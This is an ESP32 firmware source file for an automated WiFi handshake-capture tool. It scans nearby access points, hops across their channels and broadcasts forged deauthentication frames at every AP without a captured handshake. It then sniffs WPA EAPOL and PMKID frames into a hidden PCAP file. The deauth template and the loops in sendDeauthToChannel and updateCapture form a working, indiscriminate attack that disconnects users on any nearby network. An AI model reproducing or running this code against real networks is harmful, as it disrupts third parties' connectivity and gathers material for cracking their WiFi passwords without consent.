#include "pcap_manager.h"
#include "globals.h"
#include "hardware.h"
#include <WiFi.h>
#include <SPIFFS.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"

// Forward declaration
void blinkLED(int duration);

// ==================== MEMORY OPTIMIZATION ====================
void optimizeMemory() {
    // Clean old beacon trackers (older than 30 seconds)
    uint32_t currentTime = millis();
    int removed = 0;
    
    for (int i = 0; i < beaconTrackerCount; i++) {
        if (currentTime - beaconTrackers[i].lastSeen > 30000) {
            // Move last tracker to replace this one
            if (i < beaconTrackerCount - 1) {
                memcpy(&beaconTrackers[i], &beaconTrackers[beaconTrackerCount - 1], sizeof(BeaconTracker));
                i--; // Check this index again
            }
            beaconTrackerCount--;
            removed++;
        }
    }
    
    if (removed > 0) {
        Serial.printf("[MEMORY] Cleaned beacon trackers: %d removed (%d remaining)\n", removed, beaconTrackerCount);
    }
    
    // Show memory status
    Serial.printf("[MEMORY] Free heap: %d bytes\n", ESP.getFreeHeap());
}

// ==================== BUFFERED PCAP WRITE ====================
uint8_t pcapWriteBuffer[PCAP_BUFFER_SIZE];
uint16_t pcapBufferPos = 0;

void flushPcapBuffer() {
    if (pcapBufferPos > 0 && fileOpen) {
        pcapFile.write(pcapWriteBuffer, pcapBufferPos);
        pcapFile.flush();
        pcapBufferPos = 0;
    }
}

void writeToPcapBuffer(const uint8_t* data, uint16_t len) {
    // If buffer is full, flush first
    if (pcapBufferPos + len > PCAP_BUFFER_SIZE) {
        flushPcapBuffer();
    }
    
    // If data is larger than buffer, write directly
    if (len > PCAP_BUFFER_SIZE) {
        if (fileOpen) {
            pcapFile.write(data, len);
        }
        return;
    }
    
    // Add data to buffer
    memcpy(&pcapWriteBuffer[pcapBufferPos], data, len);
    pcapBufferPos += len;
}

// ==================== PACKET FILTERING FUNCTIONS ====================
bool shouldCaptureBeacon(uint8_t* bssid) {
    uint32_t currentTime = millis();
    
    // Find existing beacon tracker
    for (int i = 0; i < beaconTrackerCount; i++) {
        if (memcmp(beaconTrackers[i].bssid, bssid, 6) == 0) {
            // Check if 100ms has passed
            if (currentTime - beaconTrackers[i].lastSeen >= BEACON_DEDUPE_INTERVAL) {
                beaconTrackers[i].lastSeen = currentTime;
                return true;
            }
            return false; // Not time yet
        }
    }
    
    // No old tracker found, create new one
    if (beaconTrackerCount < MAX_BEACON_TRACKERS) {
        memcpy(beaconTrackers[beaconTrackerCount].bssid, bssid, 6);
        beaconTrackers[beaconTrackerCount].lastSeen = currentTime;
        beaconTrackerCount++;
        return true;
    }
    
    // Tracker full, use round-robin
    int oldestIndex = 0;
    uint32_t oldestTime = beaconTrackers[0].lastSeen;
    for (int i = 1; i < MAX_BEACON_TRACKERS; i++) {
        if (beaconTrackers[i].lastSeen < oldestTime) {
            oldestTime = beaconTrackers[i].lastSeen;
            oldestIndex = i;
        }
    }
    
    memcpy(beaconTrackers[oldestIndex].bssid, bssid, 6);
    beaconTrackers[oldestIndex].lastSeen = currentTime;
    return true;
}

bool shouldCapturePacket(uint8_t* payload, uint16_t len) {
    if (len < 24) return false; // Minimum size of 802.11 frame
    
    uint8_t frameType = (payload[0] & 0x0C) >> 2;
    uint8_t frameSubtype = (payload[0] & 0xF0) >> 4;
    
    switch (frameType) {
        case 0: // Management frames
            switch (frameSubtype) {
                case 0x8: // Beacon
                    // BSSID is at offset 16 for beacon
                    // Keep beacon because it may have RSN IE with PMKID
                    return shouldCaptureBeacon(&payload[16]);
                case 0x4: // Probe Request
                case 0x5: // Probe Response
                case 0xB: // Authentication
                case 0x0: // Association Request - may have PMKID
                case 0x1: // Association Response - may have PMKID
                case 0x2: // Reassociation Request - may have PMKID
                case 0x3: // Reassociation Response - may have PMKID
                    return true;
                default:
                    return false; // Don't keep other management frames
            }
            
        case 2: // Data frames - keep EAPOL only
            {
                uint8_t dataSubtype = frameSubtype;
                int dataOffset = 24;
                
                // Check QoS (subtype 8-15 are QoS frames)
                if (dataSubtype >= 8) { // QoS Data
                    dataOffset = 26;
                }
                
                // Check EAPOL (0x888e)
                if (len > dataOffset + 8 && 
                    payload[dataOffset] == 0xAA && 
                    payload[dataOffset + 1] == 0xAA && 
                    payload[dataOffset + 2] == 0x03 &&
                    payload[dataOffset + 6] == 0x88 && 
                    payload[dataOffset + 7] == 0x8e) {
                    return true; // EAPOL packet (includes PMKID in M1)
                }
                
                return false; // Don't keep other data frames
            }
            
        case 1: // Control frames - don't keep
        default:
            return false;
    }
}

// ==================== DEAUTH PACKET TEMPLATE ====================
uint8_t deauthPacket[26] = {
    0xc0, 0x00,                         // Type/Subtype: Deauthentication
    0x00, 0x00,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP BSSID) - will be replaced
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP BSSID) - will be replaced
    0x00, 0x00,                         // Sequence
    0x07, 0x00                          // Reason: Class 3 frame from nonassoc STA
};

// ==================== INITIALIZATION FUNCTIONS ====================
void initSPIFFS() {
    Serial.println("[INIT] Initializing SPIFFS...");
    
    // Try to initialize SPIFFS (formatOnFail = false)
    if (!SPIFFS.begin(false)) {
        Serial.println("[WARNING] Cannot initialize SPIFFS!");
        Serial.println("[INIT] Formatting SPIFFS...");
        
        // Try to format and restart
        if (!SPIFFS.format()) {
            Serial.println("[ERROR] Cannot format SPIFFS!");
            Serial.println("[ERROR] Please check partition scheme in Arduino IDE");
            Serial.println("[ERROR] Recommended: Tools > Partition Scheme > Default 4MB with spiffs");
            
            // Blink LED to show error
            for (int i = 0; i < 10; i++) {
                digitalWrite(LED_PIN, HIGH);
                delay(100);
                digitalWrite(LED_PIN, LOW);
                delay(100);
            }
            return;
        }
        
        Serial.println("[INIT] Format SPIFFS successful!");
        
        // Try to initialize again after format
        if (!SPIFFS.begin(false)) {
            Serial.println("[ERROR] Still cannot initialize SPIFFS after format!");
            Serial.println("[ERROR] May have hardware or partition issues");
            
            // Blink LED to show error
            for (int i = 0; i < 10; i++) {
                digitalWrite(LED_PIN, HIGH);
                delay(100);
                digitalWrite(LED_PIN, LOW);
                delay(100);
            }
            return;
        }
    }
    
    Serial.println("[INIT] SPIFFS initialized successfully!");
    
    // Check storage space
    size_t totalBytes = SPIFFS.totalBytes();
    size_t usedBytes = SPIFFS.usedBytes();
    size_t freeBytes = totalBytes - usedBytes;
    
    Serial.printf("[INIT] SPIFFS: %d KB total, %d KB used, %d KB free\n", 
                 totalBytes / 1024, usedBytes / 1024, freeBytes / 1024);
    
    // Check free space
    if (totalBytes == 0) {
        Serial.println("[ERROR] SPIFFS partition is invalid!");
        Serial.println("[ERROR] Please select Partition Scheme with SPIFFS");
        Serial.println("[ERROR] Tools > Partition Scheme > Default 4MB with spiffs");
        
        // Blink LED to show error
        for (int i = 0; i < 10; i++) {
            digitalWrite(LED_PIN, HIGH);
            delay(100);
            digitalWrite(LED_PIN, LOW);
            delay(100);
        }
        return;
    } else if (freeBytes < 50000) {
        Serial.println("[WARNING] SPIFFS space is low!");
        Serial.printf("[WARNING] Only %d KB remaining\n", freeBytes / 1024);
        
        // Show file list
        Serial.println("[INFO] Files in SPIFFS:");
        File root = SPIFFS.open("/");
        File file = root.openNextFile();
        int fileCount = 0;
        
        while (file) {
            if (!file.isDirectory()) {
                fileCount++;
                Serial.printf("[INFO] - %s (%d bytes)\n", file.name(), file.size());
            }
            file = root.openNextFile();
        }
        
        if (fileCount == 0) {
            Serial.println("[INFO] No files in SPIFFS");
        } else {
            Serial.printf("[INFO] Found %d files\n", fileCount);
            Serial.println("[INFO] Tip: Delete old files via Web Interface");
        }
    }
}

void initWiFi() {
    Serial.println("[INIT] Initializing WiFi for capture...");
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    Serial.println("[INIT] WiFi ready for capture");
}

// ==================== HELPER FUNCTIONS ====================
// Check if channel is 2.4GHz or 5GHz
bool is5GHzChannel(uint8_t channel) {
#if WIFI_5GHZ_SUPPORTED
    // 5GHz channels: 36-165
    return (channel >= 36 && channel <= 165);
#else
    return false;
#endif
}

// Convert channel to band name
const char* getChannelBand(uint8_t channel) {
    if (is5GHzChannel(channel)) {
        return "5GHz";
    } else {
        return "2.4GHz";
    }
}

// Set WiFi band for ESP32-C5
void setWiFiBand(uint8_t channel) {
#if defined(CONFIG_IDF_TARGET_ESP32C5)
    if (is5GHzChannel(channel)) {
        // Set to 5GHz band
        esp_wifi_set_band(WIFI_IF_STA, WIFI_BAND_5G);
        Serial.printf("[WIFI] Set band: 5GHz for CH%d\n", channel);
    } else {
        // Set to 2.4GHz band
        esp_wifi_set_band(WIFI_IF_STA, WIFI_BAND_2G);
        Serial.printf("[WIFI] Set band: 2.4GHz for CH%d\n", channel);
    }
#endif
}

// Change WiFi channel with log and band setting
void changeChannel(uint8_t channel) {
    // Set band for ESP32-C5
    setWiFiBand(channel);
    
    // Change channel
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // Show log
    Serial.printf("[CHANNEL] Switched to CH%d (%s)\n", channel, getChannelBand(channel));
}

String getSSIDFromBSSID(uint8_t* bssid) {
    // Find SSID from BSSID in scanned AP list
    for (int i = 0; i < apCount; i++) {
        if (memcmp(apList[i].bssid, bssid, 6) == 0) {
            return String(apList[i].ssid);
        }
    }
    return "UNKNOWN";
}

// ==================== AP SCANNING FUNCTIONS ====================
void deepScanAllAPs() {
    Serial.println("========================================");
#if WIFI_5GHZ_SUPPORTED
    Serial.println("[SCAN] Starting DEEP SCAN for all APs (2.4GHz + 5GHz)...");
#else
    Serial.println("[SCAN] Starting DEEP SCAN for all APs (2.4GHz)...");
#endif
    
    apCount = 0;
    activeChannelCount = 0;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    // DEEP SCAN: 800ms per channel
    int n = WiFi.scanNetworks(false, true, false, 800);
    
    if (n > 0) {
        Serial.printf("[SCAN] Found %d APs\n", n);
        
        // Track which channels have APs
        bool channelHasAP[MAX_CHANNELS + 1] = {false};
        
        // Count APs by band
        int count24GHz = 0;
        int count5GHz = 0;
        
        for (int i = 0; i < n && apCount < MAX_APS; i++) {
            String ssid = WiFi.SSID(i);
            
            // Handle Hidden SSID
            if (ssid.length() == 0) {
                strcpy(apList[apCount].ssid, "#HIDDEN");
            } else {
                strncpy(apList[apCount].ssid, ssid.c_str(), 32);
                apList[apCount].ssid[32] = '\0';
            }
            
            uint8_t* bssid = WiFi.BSSID(i);
            if (bssid) {
                memcpy(apList[apCount].bssid, bssid, 6);
            }
            
            apList[apCount].channel = WiFi.channel(i);
            apList[apCount].rssi = WiFi.RSSI(i);
            
            // Count by band
            if (is5GHzChannel(apList[apCount].channel)) {
                count5GHz++;
            } else {
                count24GHz++;
            }
            
            // Mark channel as having AP
            if (apList[apCount].channel >= 1 && apList[apCount].channel <= MAX_CHANNELS) {
                channelHasAP[apList[apCount].channel] = true;
            }
            
            Serial.printf("[SCAN] AP%d: %s | CH:%d (%s) | RSSI:%d | %02X:%02X:%02X:%02X:%02X:%02X\n",
                         apCount + 1,
                         apList[apCount].ssid,
                         apList[apCount].channel,
                         getChannelBand(apList[apCount].channel),
                         apList[apCount].rssi,
                         bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
            
            apCount++;
        }
        
        // Build active channels list (channels with APs)
        for (int ch = 1; ch <= MAX_CHANNELS; ch++) {
            if (channelHasAP[ch]) {
                activeChannels[activeChannelCount++] = ch;
            }
        }
        
        // Show statistics
        Serial.println("[SCAN] ========================================");
        Serial.printf("[SCAN] Summary: %d APs (2.4GHz: %d, 5GHz: %d)\n", apCount, count24GHz, count5GHz);
        Serial.println("[SCAN] Statistics by channel:");
        
        for (int i = 0; i < activeChannelCount; i++) {
            int ch = activeChannels[i];
            int count = 0;
            for (int j = 0; j < apCount; j++) {
                if (apList[j].channel == ch) count++;
            }
            Serial.printf("[SCAN] CH%d (%s): %d APs\n", ch, getChannelBand(ch), count);
        }
        
        Serial.printf("[SCAN] Active Channels (%d): ", activeChannelCount);
        for (int i = 0; i < activeChannelCount; i++) {
            Serial.printf("%d ", activeChannels[i]);
        }
        Serial.println();
    } else {
        Serial.println("[SCAN] No APs found");
    }
    
    WiFi.scanDelete();
    Serial.println("========================================");
}

// ==================== PCAP FILE FUNCTIONS ====================
String getUniqueFilename(const char* baseFilename) {
    // Check if file exists
    String filename = String(baseFilename);
    
    if (!SPIFFS.exists(filename)) {
        return filename;
    }
    
    // Separate name and extension
    int dotPos = filename.lastIndexOf('.');
    String name = filename.substring(0, dotPos);
    String ext = filename.substring(dotPos);
    
    // Try (2), (3), etc.
    for (int i = 2; i < 100; i++) {
        String newFilename = name + "(" + String(i) + ")" + ext;
        if (!SPIFFS.exists(newFilename)) {
            return newFilename;
        }
    }
    
    // Fallback: use timestamp
    return name + "_" + String(millis()) + ext;
}

void createPcapFile() {
    // Create filename in format /.auto_<seed-mills>.pcap
    char baseFilename[32];
    snprintf(baseFilename, sizeof(baseFilename), "/.auto_%lu.pcap", millis());
    
    // Check for unique filename
    String uniqueFilename = getUniqueFilename(baseFilename);
    strncpy(currentFilename, uniqueFilename.c_str(), sizeof(currentFilename) - 1);
    currentFilename[sizeof(currentFilename) - 1] = '\0';
    
    pcapFile = SPIFFS.open(currentFilename, "w");
    
    if (pcapFile) {
        fileOpen = true;
        
        // Write PCAP header
        pcap_hdr_t hdr;
        hdr.magic_number = 0xa1b2c3d4;
        hdr.version_major = 2;
        hdr.version_minor = 4;
        hdr.thiszone = 0;
        hdr.sigfigs = 0;
        hdr.snaplen = 65535;
        hdr.network = 105; // IEEE 802.11
        
        pcapFile.write((uint8_t*)&hdr, sizeof(pcap_hdr_t));
        pcapFile.flush();
        
        Serial.printf("[PCAP] Created file: %s\n", currentFilename);
    } else {
        fileOpen = false;
        Serial.println("[ERROR] Cannot create PCAP file!");
    }
}

void closePcapFile() {
    if (fileOpen && pcapFile) {
        // Flush buffer before closing file
        flushPcapBuffer();
        
        pcapFile.close();
        fileOpen = false;
        Serial.printf("[PCAP] Closed file: %s\n", currentFilename);
    }
}

// ==================== PACKET HANDLER ====================
void processEAPOLPacket(uint8_t* payload, uint16_t len, int eapolOffset) {
    // Extract BSSID (Address 3, bytes 16-21)
    uint8_t bssid[6];
    memcpy(bssid, &payload[16], 6);
    
    // Find SSID from BSSID
    String ssid = getSSIDFromBSSID(bssid);
    
    // Find or create handshake entry
    int idx = -1;
    for (int i = 0; i < handshakeCount; i++) {
        if (memcmp(handshakes[i].bssid, bssid, 6) == 0) {
            idx = i;
            break;
        }
    }
    
    if (idx == -1 && handshakeCount < MAX_HANDSHAKES) {
        idx = handshakeCount++;
        memcpy(handshakes[idx].bssid, bssid, 6);
        handshakes[idx].channel = currentChannel;
        handshakes[idx].messageFlags = 0;
        handshakes[idx].timestamp = millis();
        handshakes[idx].complete = false;
        
        Serial.printf("[HANDSHAKE] New #%d: %s | %02X:%02X:%02X:%02X:%02X:%02X | CH%d\n",
                     handshakeCount,
                     ssid.c_str(),
                     bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                     currentChannel);
    }
    
    if (idx >= 0 && len > eapolOffset + 6) {
        uint8_t packetType = payload[eapolOffset + 1];
        
        if (packetType == 3) { // Key frame
            uint16_t keyInfo = (payload[eapolOffset + 5] << 8) | payload[eapolOffset + 6];
            
            bool isPairwise = (keyInfo & 0x0008) != 0;
            bool hasInstall = (keyInfo & 0x0040) != 0;
            bool hasAck = (keyInfo & 0x0080) != 0;
            bool hasMic = (keyInfo & 0x0100) != 0;
            
            if (isPairwise) {
                if (hasAck && !hasMic && !hasInstall) {
                    // Message 1
                    if (!(handshakes[idx].messageFlags & 0x01)) {
                        handshakes[idx].messageFlags |= 0x01;
                        Serial.printf("[HANDSHAKE] M1 #%d: %s | %02X:%02X:%02X:%02X:%02X:%02X | CH%d\n",
                                     idx + 1,
                                     ssid.c_str(),
                                     bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                                     currentChannel);
                        blinkLED(100); // Short blink
                    }
                } else if (!hasAck && hasMic && !hasInstall) {
                    // Message 2 or 4
                    if ((handshakes[idx].messageFlags & 0x01) && !(handshakes[idx].messageFlags & 0x02)) {
                        handshakes[idx].messageFlags |= 0x02;
                        Serial.printf("[HANDSHAKE] M2 #%d: %s | %02X:%02X:%02X:%02X:%02X:%02X | CH%d\n",
                                     idx + 1,
                                     ssid.c_str(),
                                     bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                                     currentChannel);
                        blinkLED(100); // Short blink
                    } else if ((handshakes[idx].messageFlags & 0x04) && !(handshakes[idx].messageFlags & 0x08)) {
                        handshakes[idx].messageFlags |= 0x08;
                        Serial.printf("[HANDSHAKE] M4 #%d: %s | %02X:%02X:%02X:%02X:%02X:%02X | CH%d\n",
                                     idx + 1,
                                     ssid.c_str(),
                                     bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                                     currentChannel);
                        blinkLED(500); // Long blink 500ms
                    }
                } else if (hasAck && hasMic && hasInstall) {
                    // Message 3
                    if (!(handshakes[idx].messageFlags & 0x04)) {
                        handshakes[idx].messageFlags |= 0x04;
                        Serial.printf("[HANDSHAKE] M3 #%d: %s | %02X:%02X:%02X:%02X:%02X:%02X | CH%d\n",
                                     idx + 1,
                                     ssid.c_str(),
                                     bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                                     currentChannel);
                        blinkLED(100); // Short blink
                    }
                }
            }
            
            // Check if all 4 messages are complete
            if (handshakes[idx].messageFlags == 0x0F && !handshakes[idx].complete) {
                handshakes[idx].complete = true;
                
                // Count complete handshakes
                int completeCount = 0;
                for (int i = 0; i < handshakeCount; i++) {
                    if (handshakes[i].complete) completeCount++;
                }
                
                Serial.println("========================================");
                Serial.printf("[SUCCESS] ✓ HANDSHAKE COMPLETE! #%d (Total: %d)\n", idx + 1, completeCount);
                Serial.printf("[SUCCESS] SSID: %s\n", ssid.c_str());
                Serial.printf("[SUCCESS] BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
                Serial.printf("[SUCCESS] Channel: %d\n", currentChannel);
                Serial.printf("[SUCCESS] File: %s\n", currentFilename);
                Serial.println("========================================");
                
                // Blink LED 3 times to show success
                for (int i = 0; i < 3; i++) {
                    blinkLED(200);
                    delay(100);
                }
            }
        }
    }
}

void packetHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
    // Optimization: Check heap before processing
    if (ESP.getFreeHeap() < 8000) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    // Optimization: Check appropriate packet size
    if (len < 24 || len > 1500) return;

    packetCount++;

    // Use new packet filtering
    if (!shouldCapturePacket(payload, len)) {
        return; // Don't keep this packet
    }

    filteredPacketCount++;

    // Check EAPOL only for Data frames that passed filtering
    uint8_t frameType = (payload[0] & 0x0C) >> 2;
    if (frameType == 2) { // Data frame only
        uint8_t frameSubtype = (payload[0] & 0xF0) >> 4;
        int dataOffset = (frameSubtype >= 8) ? 26 : 24; // QoS Data : Normal Data

        // Check EAPOL signature
        if (len > dataOffset + 8 &&
            payload[dataOffset] == 0xAA &&
            payload[dataOffset + 1] == 0xAA &&
            payload[dataOffset + 2] == 0x03 &&
            payload[dataOffset + 6] == 0x88 &&
            payload[dataOffset + 7] == 0x8e) {

            processEAPOLPacket(payload, len, dataOffset + 8);
        }
    }

    // Write file only for filtered packets - use buffered write
    if (fileOpen) {
        pcaprec_hdr_t pkthdr;
        uint32_t timestamp = millis();
        pkthdr.ts_sec = timestamp / 1000;
        pkthdr.ts_usec = (timestamp % 1000) * 1000;
        pkthdr.incl_len = len;
        pkthdr.orig_len = len;

        // Write through buffer
        writeToPcapBuffer((uint8_t*)&pkthdr, sizeof(pcaprec_hdr_t));
        writeToPcapBuffer(payload, len);

        // Flush every 30 packets or when buffer is almost full
        static uint8_t flushCounter = 0;
        if (++flushCounter >= 30 || pcapBufferPos > (PCAP_BUFFER_SIZE - 1600)) {
            flushPcapBuffer();
            flushCounter = 0;
        }
    }
}


// ==================== DEAUTH FUNCTIONS ====================
void sendDeauthToChannel(uint8_t channel) {
    Serial.printf("[DEAUTH] Sending deauth to CH%d for %d seconds...\n", channel, DEAUTH_DURATION / 1000);
    
    uint32_t startTime = millis();
    int sentCount = 0;
    
    // Optimization: Count APs in this channel (exclude APs with complete handshake)
    int targetCount = 0;
    for (int i = 0; i < apCount; i++) {
        if (apList[i].channel == channel) {
            // Check if this AP already has complete handshake
            bool hasCompleteHandshake = false;
            for (int j = 0; j < handshakeCount; j++) {
                if (memcmp(handshakes[j].bssid, apList[i].bssid, 6) == 0 && handshakes[j].complete) {
                    hasCompleteHandshake = true;
                    break;
                }
            }
            
            if (!hasCompleteHandshake) {
                targetCount++;
            }
        }
    }
    
    if (targetCount == 0) {
        Serial.printf("[DEAUTH] No APs to deauth in CH%d (all have HS)\n", channel);
        return;
    }
    
    while (millis() - startTime < DEAUTH_DURATION) {
        // Send deauth to all APs in this channel (exclude APs with complete handshake)
        for (int i = 0; i < apCount; i++) {
            if (apList[i].channel == channel) {
                // Check if this AP already has complete handshake
                bool hasCompleteHandshake = false;
                for (int j = 0; j < handshakeCount; j++) {
                    if (memcmp(handshakes[j].bssid, apList[i].bssid, 6) == 0 && handshakes[j].complete) {
                        hasCompleteHandshake = true;
                        break;
                    }
                }
                
                // Send deauth only to APs without handshake
                if (!hasCompleteHandshake) {
                    // Insert AP BSSID into deauth packet
                    memcpy(&deauthPacket[10], apList[i].bssid, 6); // Source (AP)
                    memcpy(&deauthPacket[16], apList[i].bssid, 6); // BSSID (AP)
                    
                    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
                    deauthCount++;
                    sentCount++;
                }
            }
        }
        delay(DEAUTH_INTERVAL);
        
        // Optimization: Check memory during sending
        if (ESP.getFreeHeap() < 10000) {
            Serial.println("[DEAUTH] Low memory - stopping early");
            break;
        }
    }
    
    Serial.printf("[DEAUTH] Finished CH%d: %d packets to %d APs (skipped APs with HS)\n", channel, sentCount, targetCount);
}

// ==================== MAIN CAPTURE FUNCTIONS ====================
void startCapture() {
    Serial.println("========================================");
    Serial.println("[CAPTURE] Starting handshake capture");
    Serial.println("[CAPTURE] Pattern: Deauth 2s -> Capture 5s -> Hop");
    Serial.println("[CAPTURE] Hop only to channels with APs");
    Serial.println("[CAPTURE] Filter: Beacon(100ms), Probe, Auth, Assoc, EAPOL");
    Serial.println("========================================");
    
    handshakeCount = 0;
    packetCount = 0;
    filteredPacketCount = 0;
    deauthCount = 0;
    cycleCount = 0;
    beaconTrackerCount = 0;
    pcapBufferPos = 0;
    memset(beaconTrackers, 0, sizeof(beaconTrackers));
    isCapturing = true;
    
    // Set active channel
    if (activeChannelCount > 0) {
        activeChannelIndex = 0;
        currentChannel = activeChannels[0];
    } else {
        // Fallback if no APs (unlikely)
        currentChannel = 1;
    }
    
    // Create PCAP file
    createPcapFile();
    
    // Start WiFi promiscuous mode
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&packetHandler);
    
    // Start at first channel with AP
    channelStartTime = millis();
    isDeauthPhase = true;
    changeChannel(currentChannel);  // Use new function with log
    
    Serial.printf("[CAPTURE] Starting at CH%d (%s) - Phase: DEAUTH (Active channels: %d)\n", 
                  currentChannel, getChannelBand(currentChannel), activeChannelCount);
}

void updateCapture() {
    if (!isCapturing) return;
    
    uint32_t currentTime = millis();
    uint32_t timeOnChannel = currentTime - channelStartTime;
    
    if (isDeauthPhase) {
        // Phase 1: Send Deauth for 2 seconds
        if (timeOnChannel >= DEAUTH_DURATION) {
            Serial.printf("[CAPTURE] CH%d - Switching to Phase: CAPTURE\n", currentChannel);
            isDeauthPhase = false;
            channelStartTime = currentTime; // Reset time
        } else {
            // Send deauth packets continuously
            static uint32_t lastDeauth = 0;
            if (currentTime - lastDeauth >= DEAUTH_INTERVAL) {
                lastDeauth = currentTime;
                
                // Send deauth to all APs in current channel (except APs with handshake)
                for (int i = 0; i < apCount; i++) {
                    if (apList[i].channel == currentChannel) {
                        // Check if this AP has complete handshake
                        bool hasCompleteHandshake = false;
                        for (int j = 0; j < handshakeCount; j++) {
                            if (memcmp(handshakes[j].bssid, apList[i].bssid, 6) == 0 && handshakes[j].complete) {
                                hasCompleteHandshake = true;
                                break;
                            }
                        }
                        
                        // Send deauth only to APs without handshake
                        if (!hasCompleteHandshake) {
                            memcpy(&deauthPacket[10], apList[i].bssid, 6);
                            memcpy(&deauthPacket[16], apList[i].bssid, 6);
                            
                            esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
                            deauthCount++;
                        }
                    }
                }
            }
        }
    } else {
        // Phase 2: Capture handshake for 5 seconds
        if (timeOnChannel >= CAPTURE_DURATION) {
            // Change channel - Hop only to channels with APs
            if (activeChannelCount > 0) {
                activeChannelIndex++;
                if (activeChannelIndex >= activeChannelCount) {
                    activeChannelIndex = 0;
                    cycleCount++;
                    
                    // Count complete handshakes
                    int completeCount = 0;
                    for (int i = 0; i < handshakeCount; i++) {
                        if (handshakes[i].complete) completeCount++;
                    }
                    
                    Serial.println("========================================");
                    Serial.printf("[CAPTURE] Cycle %d complete! HS: %d/%d, PKT: %lu, DEAUTH: %lu\n", 
                                 cycleCount, completeCount, handshakeCount, packetCount, deauthCount);
                    Serial.println("[CAPTURE] Starting new AP scan to find new SSIDs...");
                    Serial.println("========================================");
                    
                    // Stop promiscuous mode temporarily
                    esp_wifi_set_promiscuous(false);
                    
                    // Scan APs again
                    deepScanAllAPs();
                    
                    // Optimization: Clean memory after scan
                    optimizeMemory();
                    
                    // Start promiscuous mode again
                    esp_wifi_set_promiscuous(true);
                    esp_wifi_set_promiscuous_rx_cb(&packetHandler);
                    
                    // Reset index if active channels count changed
                    if (activeChannelIndex >= activeChannelCount) {
                        activeChannelIndex = 0;
                    }
                    
                    Serial.println("========================================");
                    Serial.printf("[CAPTURE] Starting cycle %d - Found %d APs in %d channels\n", 
                                 cycleCount + 1, apCount, activeChannelCount);
                    Serial.println("========================================");
                }
                
                // Change to next channel (only channels with APs)
                currentChannel = activeChannels[activeChannelIndex];
                Serial.printf("[CAPTURE] ========================================\n");
                Serial.printf("[CAPTURE] Hopping to CH%d (%s) - (%d/%d active channels)\n", 
                             currentChannel, getChannelBand(currentChannel), 
                             activeChannelIndex + 1, activeChannelCount);
                Serial.printf("[CAPTURE] ========================================\n");
            } else {
                // Fallback: if no active channels (unlikely)
                currentChannel++;
                if (currentChannel > MAX_CHANNELS) {
                    currentChannel = 1;
                }
                Serial.printf("[CAPTURE] Fallback hopping to CH%d\n", currentChannel);
            }
            
            // Change channel and reset time
            changeChannel(currentChannel);  // Use new function with log and band setting
            channelStartTime = currentTime;
            isDeauthPhase = true;
            
            Serial.printf("[CAPTURE] CH%d (%s) - Phase: DEAUTH\n", currentChannel, getChannelBand(currentChannel));
        }
    }
}

void stopCapture() {
    if (!isCapturing) return;
    
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    
    closePcapFile();
    isCapturing = false;
    
    // Count complete handshakes
    int completeCount = 0;
    for (int i = 0; i < handshakeCount; i++) {
        if (handshakes[i].complete) completeCount++;
    }
    
    // Calculate filter efficiency
    float filterRatio = (packetCount > 0) ? ((float)filteredPacketCount / packetCount * 100.0) : 0;
    
    Serial.println("========================================");
    Serial.println("[CAPTURE] Capture stopped");
    Serial.printf("[CAPTURE] Total statistics:\n");
    Serial.printf("[CAPTURE] - Total cycles: %d\n", cycleCount);
    Serial.printf("[CAPTURE] - Handshakes: %d/%d complete\n", completeCount, handshakeCount);
    Serial.printf("[CAPTURE] - Total packets: %lu\n", packetCount);
    Serial.printf("[CAPTURE] - Filtered packets: %lu (%.1f%%)\n", filteredPacketCount, filterRatio);
    Serial.printf("[CAPTURE] - Beacon trackers: %d\n", beaconTrackerCount);
    Serial.printf("[CAPTURE] - Deauth sent: %lu\n", deauthCount);
    Serial.printf("[CAPTURE] - File: %s\n", currentFilename);
    
    // Show handshake details
    for (int i = 0; i < handshakeCount; i++) {
        String ssid = getSSIDFromBSSID(handshakes[i].bssid);
        Serial.printf("[CAPTURE] HS%d: %s | CH%d | Flags:%d%d%d%d %s\n", 
                     i + 1,
                     ssid.c_str(),
                     handshakes[i].channel,
                     (handshakes[i].messageFlags & 0x01) ? 1 : 0,
                     (handshakes[i].messageFlags & 0x02) ? 1 : 0,
                     (handshakes[i].messageFlags & 0x04) ? 1 : 0,
                     (handshakes[i].messageFlags & 0x08) ? 1 : 0,
                     handshakes[i].complete ? "[COMPLETE]" : "");
    }
    
    Serial.println("========================================");
}